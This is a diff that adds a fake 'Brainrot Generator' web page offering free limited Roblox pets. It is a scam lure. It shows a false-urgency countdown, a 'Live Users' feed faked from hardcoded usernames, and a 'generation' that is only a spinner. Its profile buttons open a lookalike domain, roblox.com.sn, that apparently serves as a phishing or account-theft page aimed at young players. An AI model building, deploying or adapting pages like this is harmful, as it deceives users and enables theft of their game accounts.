@@ -1,0 +1,414 @@
+<!doctype html>
+<html lang="en">
+<head>
+<meta charset="utf-8" />
+<meta name="viewport" content="width=device-width,initial-scale=1" />
+<title>✨ Sammy Brainrot Generator ✨</title>
+<style>
+  :root{
+    --bg1:#1e1f2e; --bg2:#2c2e47;
+    --card-bg:rgba(255,255,255,0.08);
+    --accent:#ff7a3d;
+    --text:#f8f9fa;
+    --muted:#a1a1b0;
+    --shadow:0 10px 30px rgba(0,0,0,0.4);
+    --glass-border:1px solid rgba(255,255,255,0.15);
+  }
+  *{box-sizing:border-box;margin:0;padding:0}
+  body{
+    font-family:"Inter", system-ui, sans-serif;
+    background:linear-gradient(160deg,var(--bg1),var(--bg2));
+    color:var(--text);
+    -webkit-font-smoothing:antialiased;
+    min-height:100vh;
+    display:flex;
+    justify-content:center;
+    align-items:flex-start;
+    padding:20px;
+  }
+
+  .container{
+    width:100%;max-width:1200px;
+    display:grid;
+    grid-template-columns:1fr 350px;
+    gap:20px;
+  }
+
+  header{
+    grid-column:1/3;
+    text-align:center;
+    margin-bottom:10px;
+  }
+  h1{
+    font-size:2.2rem;
+    font-weight:800;
+    color:#fff;
+    background:linear-gradient(90deg,#ff7a3d,#ffae00);
+    -webkit-background-clip:text;
+    -webkit-text-fill-color:transparent;
+    letter-spacing:1px;
+    margin-bottom:12px;
+  }
+
+  .banner{
+    display:inline-block;
+    background:linear-gradient(135deg,#ff3d6a,#ff7a3d);
+    color:#fff;
+    padding:14px 24px;
+    border-radius:16px;
+    box-shadow:var(--shadow);
+    font-weight:700;
+    animation:pulse 2s infinite;
+  }
+  .banner .timer{font-size:20px;font-weight:800;display:block;margin-top:6px}
+  @keyframes pulse{0%{transform:scale(1)}50%{transform:scale(1.05)}100%{transform:scale(1)}}
+
+  /* card */
+  .card{
+    background:var(--card-bg);
+    border:var(--glass-border);
+    padding:18px;
+    border-radius:18px;
+    box-shadow:var(--shadow);
+    backdrop-filter:blur(14px);
+    transition:transform .2s, box-shadow .2s;
+  }
+  .card:hover{transform:translateY(-3px);box-shadow:0 15px 40px rgba(0,0,0,0.6)}
+
+  h3{margin-bottom:10px;font-size:1.2rem;font-weight:700}
+
+  .field{
+    width:100%;padding:12px;
+    border-radius:12px;
+    border:1px solid rgba(255,255,255,0.2);
+    background:rgba(255,255,255,0.1);
+    color:#fff;
+    font-size:15px;
+    outline:none;
+  }
+  .field::placeholder{color:#bbb}
+
+  .btn{
+    padding:10px 16px;
+    border:none;
+    border-radius:12px;
+    font-weight:700;
+    cursor:pointer;
+    transition:all .2s;
+    background:linear-gradient(135deg,#ff7a3d,#ffae00);
+    color:#fff;
+    box-shadow:0 4px 12px rgba(255,122,61,0.4);
+  }
+  .btn:hover{transform:scale(1.05)}
+  .btn.secondary{background:#fff;color:#ff7a3d;box-shadow:none}
+
+  .muted{color:var(--muted);font-size:0.9rem}
+
+  /* profile box */
+  #profileBox{
+    text-align:center;
+    display:flex;
+    flex-direction:column;
+    align-items:center;
+    gap:12px;
+  }
+  #profileBox img{
+    width:110px;height:110px;
+    border-radius:50%;
+    border:3px solid #ffae00;
+    box-shadow:0 0 15px rgba(255,174,0,0.6);
+    object-fit:cover;
+  }
+
+  /* pet card */
+  .pet-card{
+    position:relative;
+    border-radius:16px;
+    padding:20px;
+    text-align:center;
+    background:rgba(255,255,255,0.05);
+  }
+  .pet-card img{
+    width:140px;height:140px;
+    object-fit:cover;
+    border-radius:14px;
+    margin:0 auto 10px;
+    box-shadow:0 6px 16px rgba(0,0,0,0.3);
+  }
+  .badge{
+    position:absolute;
+    top:10px;right:10px;
+    background:linear-gradient(135deg,#ff7a3d,#ffae00);
+    padding:6px 12px;
+    border-radius:999px;
+    font-size:0.75rem;
+    font-weight:900;
+    color:#fff;
+    letter-spacing:1px;
+    animation:glow 2s infinite alternate;
+  }
+  @keyframes glow{
+    from{box-shadow:0 0 8px rgba(255,174,0,0.6)}
+    to{box-shadow:0 0 16px rgba(255,122,61,0.8)}
+  }
+
+  .qty-row{
+    display:flex;justify-content:center;align-items:center;
+    gap:10px;margin-top:12px
+  }
+  .qty-btn{
+    width:40px;height:40px;
+    border:none;border-radius:10px;
+    background:rgba(255,255,255,0.1);
+    color:#fff;font-size:18px;font-weight:700;
+    cursor:pointer;transition:0.2s;
+  }
+  .qty-btn:hover{background:rgba(255,255,255,0.25)}
+
+  /* live users */
+  .live-users{max-height:200px;overflow-y:auto}
+  .live-entry{
+    display:flex;align-items:center;gap:10px;
+    padding:8px;
+    background:rgba(255,255,255,0.05);
+    border-radius:12px;
+    margin-bottom:8px;
+    animation:fadeInSlide 0.5s ease;
+  }
+  .live-entry img{width:38px;height:38px;border-radius:50%}
+  @keyframes fadeInSlide{from{opacity:0;transform:translateY(10px)}to{opacity:1;transform:translateY(0)}}
+
+  /* modal */
+  .modal-back{
+    position:fixed;inset:0;
+    background:rgba(0,0,0,0.6);
+    display:none;align-items:center;justify-content:center;
+    z-index:999;
+  }
+  .modal{
+    background:#2b2d42;
+    padding:20px;
+    border-radius:16px;
+    width:92%;max-width:500px;
+    text-align:center;
+    color:#fff;
+    box-shadow:0 20px 50px rgba(0,0,0,0.6);
+  }
+  .spinner{
+    width:60px;height:60px;
+    border-radius:50%;
+    border:6px solid rgba(255,255,255,0.1);
+    border-top-color:#ff7a3d;
+    animation:spin 1s linear infinite;
+    margin:20px auto;
+  }
+  @keyframes spin{to{transform:rotate(360deg)}}
+
+  /* responsive */
+  @media(max-width:960px){
+    .container{grid-template-columns:1fr}
+  }
+</style>
+</head>
+<body>
+<div class="container">
+  <header>
+    <h1>✨ Brainrot Generator ✨</h1>
+    <div class="banner">
+      LIMITED TIME EVENT
+      <span class="timer" id="timer">--:--:--</span>
+      <div class="muted">Claim yours now!</div>
+    </div>
+  </header>
+
+  <!-- connect -->
+  <div class="card">
+    <h3>🔗 Connect Your Roblox</h3>
+    <input id="username" class="field" placeholder="Enter Roblox username (no password needed!)" />
+    <div style="margin:10px 0"></div>
+    <button class="btn" id="connectBtn">Connect</button>
+    <div id="connectHint" class="muted" style="margin-top:8px">Not connected</div>
+  </div>
+
+  <!-- profile + live -->
+  <aside>
+    <div class="card" id="profileBox">
+      <h3>🧑 Roblox Profile</h3>
+      <div class="muted">Not connected</div>
+    </div>
+    <div class="card">
+      <h3>👥 Live Users</h3>
+      <div class="live-users" id="liveUsers"><div class="muted">No users yet ❌</div></div>
+    </div>
+  </aside>
+
+  <!-- pets -->
+  <div class="card">
+    <div class="pet-card">
+      <div class="badge">Secret</div>
+      <img id="petImage1" src="https://cdn.discordapp.com/attachments/1420193110956314776/1420321892631314433/images_40.jpg?ex=68d4f957&is=68d3a7d7&hm=ef4b2b728f6ade8111261cc13fe60b2277090a5a5b3e150a4ee50902d5fe7101&">
+      <h4>🐉 Dragon Canneloni</h4>
+      <div class="muted">💥Secret</div>
+      <div class="qty-row">
+        <button class="qty-btn" onclick="setQty(1,-1)">−</button>
+        <div><div class="muted">Selected</div><div id="qtyDisplay1" style="font-weight:800">1</div></div>
+        <button class="qty-btn" onclick="setQty(1,1)">+</button>
+      </div>
+      <button class="btn" style="margin-top:12px" onclick="generatePet(1,'Dragon Canneloni')">Generate</button>
+    </div>
+  </div>
+
+  <div class="card">
+    <div class="pet-card">
+      <div class="badge">Secret</div>
+      <img id="petImage2" src="https://cdn.discordapp.com/attachments/1420193110956314776/1420321896674627615/images_44.jpg?ex=68d4f958&is=68d3a7d8&hm=2322bf7adca80003d3035b20a62ed35e7da3ea5e4fe5cceb03582b328dde6517&">
+      <h4>🔥 Spaghetti Tualetti</h4>
+      <div class="muted">🕷Secret</div>
+      <div class="qty-row">
+        <button class="qty-btn" onclick="setQty(2,-1)">−</button>
+        <div><div class="muted">Selected</div><div id="qtyDisplay2" style="font-weight:800">1</div></div>
+        <button class="qty-btn" onclick="setQty(2,1)">+</button>
+      </div>
+      <button class="btn" style="margin-top:12px" onclick="generatePet(2,'Phoenix Spaghetti')">Generate</button>
+    </div>
+  </div>
+
+  <!-- generate all -->
+  <div style="grid-column:1/2;text-align:center;margin-top:10px">
+    <button class="btn" onclick="generateAll()">✨ Generate All</button>
+  </div>
+</div>
+
+<!-- modals -->
+<div class="modal-back" id="loadingModal">
+  <div class="modal"><div class="spinner"></div><div>Generating your pet...</div></div>
+</div>
+<div class="modal-back" id="resultModal">
+  <div class="modal">
+    <h3>Your Pets</h3>
+    <div id="resultBody" style="margin:12px 0"></div>
+    <div style="display:flex;gap:10px;justify-content:center">
+      <button class="btn" id="visitProfileBtn">Visit My Roblox Profile</button>
+      <button class="btn secondary" onclick="closeAllModals()">Close</button>
+    </div>
+  </div>
+</div>
+
+<script>
+const CORS_PROXY="https://corsproxy.io/?";
+const FALLBACK_AVATAR="https://upload.wikimedia.org/wikipedia/commons/6/6e/Roblox_Avatar.png";
+const ROBLOX_PROFILE_BASE ="https://www.roblox.com.sn/users/1462664872/profile";
+
+let connected=null;
+let qtys={1:1,2:1};
+
+function setQty(card,delta){
+  qtys[card]=Math.min(2,Math.max(1,qtys[card]+delta));
+  document.getElementById("qtyDisplay"+card).textContent=qtys[card];
+}
+
+function showProfile(username,avatarUrl,userId){
+  profileBox.innerHTML=`
+    <h3>Roblox Profile</h3>
+    <img src="${avatarUrl}" alt="Avatar" onerror="this.onerror=null;this.src='${FALLBACK_AVATAR}'">
+    <div style="font-weight:700;margin-top:6px">@${username}</div>
+  `;
+  connectHint.textContent="Connected as @"+username;
+}
+
+function addLiveUser(name,avatar,qty,userId,petName){
+  if(liveUsers.querySelector(".muted")) liveUsers.innerHTML="";
+  const div=document.createElement("div");
+  div.className="live-entry new";
+  div.innerHTML=`<img src="${avatar||FALLBACK_AVATAR}" onerror="this.onerror=null;this.src='${FALLBACK_AVATAR}'"><div><strong>@${name}</strong> claimed <strong>${qty}x</strong> ${petName}</div>`;
+  div.onclick=()=>window.open(`${ROBLOX_PROFILE_BASE}/${userId||""}/profile`,"_blank");
+  liveUsers.prepend(div);
+  setTimeout(()=>div.classList.remove("new"),600);
+  while(liveUsers.children.length>14) liveUsers.removeChild(liveUsers.lastChild);
+}
+
+function generatePet(card,petName){
+  if(!connected){alert("Please connect your Roblox username first");return;}
+  loadingModal.style.display="flex";
+  setTimeout(()=>{
+    loadingModal.style.display="none";
+    resultBody.innerHTML=`
+      <div style="display:flex;gap:12px;align-items:center;justify-content:center;flex-wrap:wrap">
+        <img src="${document.getElementById("petImage"+card).src}" style="width:90px;height:90px;border-radius:10px;object-fit:cover">
+        <div style="text-align:left">
+          <div style="font-weight:800">${petName} (LIMITED)</div>
+          <div class="muted">${qtys[card]}x claimed by @${connected.username}</div>
+        </div>
+      </div>
+    `;
+    visitProfileBtn.onclick=()=>window.open(`${ROBLOX_PROFILE_BASE}/${connected.userId}/profile`,"_blank");
+    resultModal.style.display="flex";
+    addLiveUser(connected.username,connected.avatar,qtys[card],connected.userId,petName);
+  },2000);
+}
+
+function generateAll(){
+  generatePet(1,"Dragon Canneloni");
+  setTimeout(()=>generatePet(2,"Spaghetti Tualetti"),2200);
+}
+
+function closeAllModals(){loadingModal.style.display="none";resultModal.style.display="none";}
+
+document.getElementById("connectBtn").addEventListener("click",async()=>{
+  const username=document.getElementById("username").value.trim();
+  if(!username){alert("Type your Roblox username first");return;}
+  connectHint.textContent="Connecting...";
+  const info=await fetchRobloxAvatar(username);
+  if(info&&info.avatarUrl){
+    connected={username,userId:info.userId,avatar:info.avatarUrl};
+    showProfile(username,info.avatarUrl,info.userId);
+  }else{
+    connected={username,userId:null,avatar:FALLBACK_AVATAR};
+    showProfile(username,FALLBACK_AVATAR,null);
+  }
+});
+
+async function fetchRobloxAvatar(username){
+  try{
+    const lookupUrl="https://users.roblox.com/v1/usernames/users";
+    const r1=await fetch(CORS_PROXY+encodeURIComponent(lookupUrl),{
+      method:"POST",headers:{"Content-Type":"application/json"},
+      body:JSON.stringify({usernames:[username]})
+    });
+    let parsed1=await r1.json();
+    if(!parsed1.data||!parsed1.data.length) throw new Error("User not found");
+    const userId=parsed1.data[0].id;
+    const thumbUrl=`https://thumbnails.roblox.com/v1/users/avatar-headshot?userIds=${userId}&size=150x150&format=Png&isCircular=true`;
+    const r2=await fetch(CORS_PROXY+encodeURIComponent(thumbUrl));
+    let parsed2=await r2.json();
+    return {userId,avatarUrl:parsed2.data[0].imageUrl};
+  }catch(e){return null;}
+}
+
+const FAKE_USERS=[
+  {name:"CoolGamer123",id:1},{name:"xXShadowXx_99",id:2},{name:"LuffyFan_07",id:3},
+  {name:"NinjaPro2000",id:4},{name:"RobloxKing88",id:5}
+];
+async function fetchAvatarForUser(user){
+  try{
+    const url=`https://thumbnails.roblox.com/v1/users/avatar-headshot?userIds=${user.id}&size=48x48&format=Png&isCircular=true`;
+    const r=await fetch(CORS_PROXY+encodeURIComponent(url));
+    const parsed=await r.json();
+    user.avatar=(parsed.data&&parsed.data[0].imageUrl)||FALLBACK_AVATAR;
+  }catch(e){user.avatar=FALLBACK_AVATAR;}
+}
+async function preloadFakeAvatars(){for(const u of FAKE_USERS){await fetchAvatarForUser(u);}}
+preloadFakeAvatars();
+setInterval(()=>{
+  const pick=FAKE_USERS[Math.floor(Math.random()*FAKE_USERS.length)];
+  const count=Math.floor(Math.random()*2)+1;
+  const petNames=["Gararam and Madundung","Spaghetti Toilleti"];
+  addLiveUser(pick.name,pick.avatar,count,pick.id,petNames[Math.floor(Math.random()*petNames.length)]);
+},4500);
+
+function startTimer(sec){const el=document.getElementById("timer");const iv=setInterval(()=>{if(sec<=0){el.textContent="00:00:00";clearInterval(iv);return;}const h=String(Math.floor(sec/3600)).padStart(2,"0");const m=String(Math.floor((sec%3600)/60)).padStart(2,"0");const s=String(sec%60).padStart(2,"0");el.textContent=`${h}:${m}:${s}`;sec--;},1000);}
+startTimer(3600);
+</script>
+</body>
+</body>
+</html>
